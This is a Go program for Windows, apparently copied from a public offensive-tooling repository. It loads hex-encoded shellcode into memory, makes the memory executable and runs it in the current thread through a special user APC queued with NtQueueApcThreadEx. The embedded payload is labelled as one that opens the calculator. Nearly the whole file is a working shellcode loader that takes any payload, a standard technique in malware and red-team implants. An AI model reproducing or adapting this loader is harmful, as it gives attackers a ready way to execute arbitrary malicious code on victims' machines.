//go:build windows
// +build windows

// CREDIT: https://raw.githubusercontent.com/Ne0nd0g/go-shellcode/master/cmd/NtQueueApcThreadEx-Local/main.go

/*
This program executes shellcode in the current process using the following steps
	1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
	3. Change the memory page permissions to Execute/Read with VirtualProtect
	4. Get a handle to the current thread
	4. Execute the shellcode in the current thread by creating a "Special User APC" through the NtQueueApcThreadEx function

References:
	1. https://repnz.github.io/posts/apc/user-apc/
	2. https://docs.rs/ntapi/0.3.1/ntapi/ntpsapi/fn.NtQueueApcThreadEx.html
	3. https://0x00sec.org/t/process-injection-apc-injection/24608
	4. https://twitter.com/aionescu/status/992264290924032005
	5. http://www.opening-windows.com/techart_windows_vista_apc_internals2.htm#_Toc229652505

*/

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

// https://docs.microsoft.com/en-us/windows/win32/midl/enum
const (
	QUEUE_USER_APC_FLAGS_NONE = iota
	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
	QUEUE_USER_APC_FLGAS_MAX_VALUE
)

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	// Pop Calc Shellcode
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect, and RtlCopyMemory procedures...")
	}
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode...")
	}
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
	}

	if *debug {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
	}
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling GetCurrentThread...")
	}
	thread, _, err := GetCurrentThread.Call()
	if err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", err))
	}
	if *verbose {
		fmt.Printf("[-]Got handle to current thread: %v\n", thread)
	}

	if *debug {
		fmt.Println("[DEBUG]Calling NtQueueApcThreadEx...")
	}
	//USER_APC_OPTION := uintptr(QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC)
	_, _, err = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
	if err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", err))
	}
	if *verbose {
		fmt.Println("[-]Queued special user APC")
	}

	if *verbose {
		fmt.Println("[+]Shellcode Executed")
	}

}

// export GOOS=windows GOARCH=amd64;go build -o NtQueueApcThreadEx.exe ./NtQueueApcThreadEx.go
